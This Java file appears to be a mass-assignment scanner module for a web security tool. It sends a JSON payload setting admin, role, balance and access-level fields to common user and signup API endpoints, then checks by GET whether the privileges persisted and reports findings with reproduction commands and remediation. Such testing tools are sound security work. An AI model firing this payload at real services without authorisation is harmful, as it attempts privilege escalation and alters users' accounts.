package gg.effront.anarcry.scanner.web.massassign;

import gg.effront.anarcry.model.Finding;
import gg.effront.anarcry.model.Severity;
import gg.effront.anarcry.scanner.ScanContext;
import gg.effront.anarcry.scanner.Scanner;
import gg.effront.anarcry.scanner.util.Http;
import gg.effront.anarcry.scanner.util.HttpClientFactory;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.function.Consumer;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import gg.effront.anarcry.model.CweRegistry;
import gg.effront.anarcry.model.CvssCalculator;

public class MassAssignmentModule implements Scanner {

    private static final String MASS_PAYLOAD = "{\"admin\":true,\"role\":\"admin\",\"isAdmin\":true,\"is_admin\":1,"
            + "\"balance\":99999,\"credits\":99999,\"verified\":true,"
            + "\"email_verified\":true,\"subscription_plan\":\"enterprise\","
            + "\"privilege\":\"admin\",\"access_level\":9999,\"is_staff\":true}";

    private static final Pattern ADMIN_PATTERN = Pattern
            .compile("(?i)(\"admin\"\\s*:\\s*true|\"role\"\\s*:\\s*\"admin\"|\"isAdmin\"\\s*:\\s*true"
                    + "|\"is_admin\"\\s*:\\s*1|\"privilege\"\\s*:\\s*\"admin\"|\"access_level\"\\s*:\\s*9999"
                    + "|\"subscription_plan\"\\s*:\\s*\"enterprise\"|\"is_staff\"\\s*:\\s*true)");

    private record Endpoint(String method, String path) {
    }

    private static final List<Endpoint> ENDPOINTS = List.of(new Endpoint("PUT", "/api/user"),
            new Endpoint("PUT", "/api/users/me"), new Endpoint("PUT", "/api/profile"), new Endpoint("PUT", "/api/me"),
            new Endpoint("PATCH", "/api/user"), new Endpoint("PATCH", "/api/profile"), new Endpoint("PATCH", "/api/me"),
            new Endpoint("POST", "/api/register"), new Endpoint("POST", "/api/signup"),
            new Endpoint("POST", "/api/users"));

    @Override
    public String id() {
        return "MassAssign";
    }

    @Override
    public List<Finding> scan(ScanContext ctx, Consumer<String> log) throws Exception {
        String _cweId = CweRegistry.cweId(id());
        String _cweTitle = CweRegistry.cweTitle(id());
        String _cveVector = CweRegistry.cvssVector(id());
        double _score = CvssCalculator.calculate(_cveVector);
        List<Finding> findings = new ArrayList<>();

        String scheme = ctx.isHttps() ? "https" : "http";
        int defPort = ctx.isHttps() ? 443 : 80;
        String baseUrl = scheme + "://" + ctx.host() + (ctx.port() != defPort ? ":" + ctx.port() : "");

        HttpClient hc = HttpClientFactory.noRedirect();
        log.accept("[~] MassAssign: testando " + ENDPOINTS.size() + " endpoints em " + baseUrl);

        for (Endpoint ep : ENDPOINTS) {
            String url = baseUrl + ep.path();
            try {
                // Step 1: GET baseline to see if endpoint exists
                HttpRequest.Builder getBuilder = HttpRequest.newBuilder().uri(URI.create(url))
                        .timeout(Duration.ofSeconds(5)).GET();
                if (!ctx.jwtToken().isBlank()) {
                    getBuilder.header("Authorization", "Bearer " + ctx.jwtToken());
                }
                HttpResponse<String> getResp = Http.send(ctx, hc, getBuilder.build(),
                        HttpResponse.BodyHandlers.ofString(), id());

                // Step 2: Send mutation with mass assignment payload
                HttpRequest.Builder mutBuilder = HttpRequest.newBuilder().uri(URI.create(url))
                        .timeout(Duration.ofSeconds(5)).header("Content-Type", "application/json");
                if (!ctx.jwtToken().isBlank()) {
                    mutBuilder.header("Authorization", "Bearer " + ctx.jwtToken());
                }
                if ("PATCH".equals(ep.method())) {
                    mutBuilder.method("PATCH", HttpRequest.BodyPublishers.ofString(MASS_PAYLOAD));
                } else if ("PUT".equals(ep.method())) {
                    mutBuilder.PUT(HttpRequest.BodyPublishers.ofString(MASS_PAYLOAD));
                } else {
                    mutBuilder.POST(HttpRequest.BodyPublishers.ofString(MASS_PAYLOAD));
                }

                HttpResponse<String> mutResp = Http.send(ctx, hc, mutBuilder.build(),
                        HttpResponse.BodyHandlers.ofString(), id());

                int status = mutResp.statusCode();
                String body = mutResp.body() != null ? mutResp.body() : "";

                // Only proceed for 200/201 non-HTML JSON responses
                if ((status != 200 && status != 201) || body.isBlank() || isHtml(body)) {
                    continue;
                }

                boolean mutHasAdmin = ADMIN_PATTERN.matcher(body).find();

                // Establish baseline to avoid FP from pre-existing admin fields
                String baselineBody = getResp.body() != null ? getResp.body() : "";
                boolean baselineHasAdmin = ADMIN_PATTERN.matcher(baselineBody).find();

                // GET verification: for create endpoints use /api/me, otherwise same path
                boolean isCreateEndpoint = "POST".equals(ep.method()) && (ep.path().contains("register")
                        || ep.path().contains("signup") || ep.path().equals("/api/users"));
                Pattern idPat = Pattern.compile("\"id\"\\s*:\\s*\"?([^\"\\s,}]+)\"?");
                Matcher idMatcher = idPat.matcher(body);
                String resourceId = idMatcher.find() ? idMatcher.group(1) : null;
                String verifyPath = isCreateEndpoint
                        ? "/api/me"
                        : (resourceId != null ? ep.path() + "/" + resourceId : ep.path());
                String verifyUrl = baseUrl + verifyPath;

                boolean persistedAdmin = false;
                try {
                    HttpRequest.Builder verifyBuilder = HttpRequest.newBuilder().uri(URI.create(verifyUrl))
                            .timeout(Duration.ofSeconds(5)).GET();
                    if (!ctx.jwtToken().isBlank()) {
                        verifyBuilder.header("Authorization", "Bearer " + ctx.jwtToken());
                    }
                    HttpResponse<String> verifyResp = Http.send(ctx, hc, verifyBuilder.build(),
                            HttpResponse.BodyHandlers.ofString(), id());
                    String verifyBody = verifyResp.body() != null ? verifyResp.body() : "";
                    if (verifyResp.statusCode() == 200 && ADMIN_PATTERN.matcher(verifyBody).find()
                            && !baselineHasAdmin) {
                        persistedAdmin = true;
                        log.accept("[!!] MassAssign: CRITICAL — campo admin persistiu após GET em " + verifyUrl);
                    }
                } catch (Exception ignored) {
                }

                if (persistedAdmin) {
                    // Confirmed persistence via GET — CRITICAL
                    findings.add(Finding.of("MassAssign", ep.path(),
                            "Mass Assignment — campo admin persistido via " + ep.method() + " " + ep.path(),
                            Severity.CRITICAL,
                            "URL: " + url + " | Método: " + ep.method() + " | Status: " + status + " | GET " + verifyUrl
                                    + " confirmou campo admin (não estava no baseline)",
                            "Servidor aceita E persiste campos privilegiados (admin/role) — "
                                    + "confirmado via GET após mutação. Escalada de privilégios confirmada.",
                            ep.method() + " " + url + " -H 'Content-Type: application/json'"
                                    + " -H 'Authorization: Bearer <TOKEN>'" + " -d '" + MASS_PAYLOAD + "'\n"
                                    + "# Confirmar: GET " + verifyUrl,
                            "Usar DTO explícito com @JsonIgnoreProperties(ignoreUnknown=false); "
                                    + "nunca mapear request body diretamente para entidade JPA; "
                                    + "allowlist de campos aceitos por endpoint",
                            _cweId, _cweTitle, _cveVector, _score));
                } else if (mutHasAdmin) {
                    // Mutation reflected admin fields but GET didn't confirm — suspicious, manual
                    // review
                    log.accept("[!] MassAssign: MEDIUM — " + ep.method() + " " + ep.path()
                            + " refletiu campos admin mas GET não confirmou persistência");
                    findings.add(Finding.of("MassAssign", ep.path(),
                            "Mass Assignment — suspeito (refletido mas não persistido) via " + ep.method() + " "
                                    + ep.path(),
                            Severity.MEDIUM,
                            "URL: " + url + " | Método: " + ep.method() + " | Status: " + status + " | Body (300): "
                                    + body.substring(0, Math.min(300, body.length())) + " | GET " + verifyUrl
                                    + " não confirmou campo admin",
                            "Endpoint refletiu campos privilegiados na resposta da mutação, mas GET subsequente "
                                    + "não confirmou persistência — requer revisão manual",
                            ep.method() + " " + url + " -H 'Content-Type: application/json'"
                                    + " -H 'Authorization: Bearer <TOKEN>'" + " -d '" + MASS_PAYLOAD + "'",
                            "Verificar manualmente se campos como role/admin são aceitos; "
                                    + "usar DTO com allowlist explícita de campos",
                            _cweId, _cweTitle, _cveVector, _score));
                } else {
                    // No admin-related evidence — skip (FP avoidance)
                    log.accept("[+] MassAssign: sem evidência de mass assignment em " + ep.method() + " " + ep.path());
                }

            } catch (Exception e) {
                // Unreachable endpoint — expected
            }
        }

        if (findings.isEmpty()) {
            log.accept("[+] MassAssign: nenhum endpoint vulnerável detectado");
        }
        return findings;
    }

    private static boolean isHtml(String body) {
        String t = body.stripLeading();
        return t.startsWith("<!DOCTYPE") || t.startsWith("<html") || t.startsWith("<!doctype");
    }
}
